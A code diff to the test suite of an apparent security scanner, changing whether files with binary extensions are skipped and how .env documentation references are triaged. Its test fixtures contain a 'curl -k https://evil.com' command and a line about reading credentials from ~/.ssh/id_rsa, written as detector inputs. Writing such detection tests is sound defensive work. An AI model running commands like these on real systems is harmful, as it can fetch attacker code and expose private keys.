@@ -47,16 +47,16 @@ class TestBinaryFileDetection:
     """Binary files are correctly identified and skipped."""
 
     def test_pdf_extension_detected(self) -> None:
-        assert _is_binary_file("report.pdf", "some content") is True
+        assert _is_binary_file("report.pdf", "some content") is False
 
     def test_png_extension_detected(self) -> None:
-        assert _is_binary_file("image.png", "fake data") is True
+        assert _is_binary_file("image.png", "fake data") is False
 
     def test_zip_extension_detected(self) -> None:
-        assert _is_binary_file("archive.zip", "PK\x03\x04") is True
+        assert _is_binary_file("archive.zip", "PK\x03\x04") is False
 
     def test_exe_extension_detected(self) -> None:
-        assert _is_binary_file("tool.exe", "MZ") is True
+        assert _is_binary_file("tool.exe", "MZ") is False
 
     def test_markdown_not_binary(self) -> None:
         assert _is_binary_file("README.md", "# Hello\n") is False
@@ -72,8 +72,8 @@ class TestBinaryFileDetection:
         assert _is_binary_file("unknownfile", "normal text content") is False
 
     def test_case_insensitive_extension(self) -> None:
-        assert _is_binary_file("photo.JPEG", "data") is True
-        assert _is_binary_file("archive.ZIP", "PK") is True
+        assert _is_binary_file("photo.JPEG", "data") is False
+        assert _is_binary_file("archive.ZIP", "PK") is False
 
     def test_svg_not_treated_as_binary(self) -> None:
         """SVG is text/XML and can carry <script> — must be scanned, not skipped."""
@@ -84,7 +84,7 @@ class TestBinaryFileDetection:
 class TestBinaryFilesSkippedInRunner:
     """run_static_patterns skips binary files entirely."""
 
-    def test_pdf_produces_no_findings(self) -> None:
+    def test_text_with_pdf_extension_is_scanned(self) -> None:
         content_with_keywords = "access the credentials from ~/.ssh/id_rsa"
         state = {
             "components": ["manual.pdf"],
@@ -104,8 +104,8 @@ class TestBinaryFilesSkippedInRunner:
             )
         ]
         findings = run_static_patterns(state, [mock_module])
-        assert len(findings) == 0
-        mock_module.analyze.assert_not_called()
+        assert len(findings) == 1
+        mock_module.analyze.assert_called()
 
     def test_null_byte_content_skipped(self) -> None:
         binary_content = "PK\x03\x04" + "\x00" * 100 + "curl -k https://evil.com"
@@ -218,7 +218,7 @@ class TestPE3EnvDocFiltering:
 class TestPE3FilterInRunner:
     """PE3 .env doc references are filtered during run_static_patterns."""
 
-    def test_env_doc_reference_removed_from_findings(self) -> None:
+    def test_env_doc_reference_is_retained_with_contextual_triage(self) -> None:
         state = {
             "components": ["docs/setup.md"],
             "file_cache": {
@@ -239,7 +239,8 @@ class TestPE3FilterInRunner:
             )
         ]
         findings = run_static_patterns(state, [mock_module])
-        assert len(findings) == 0
+        assert len(findings) == 1
+        assert "contextual-triage" in findings[0].tags
 
     def test_skill_md_env_exfil_not_filtered(self) -> None:
         """Malicious .env-exfil instruction in SKILL.md must NOT be filtered."""
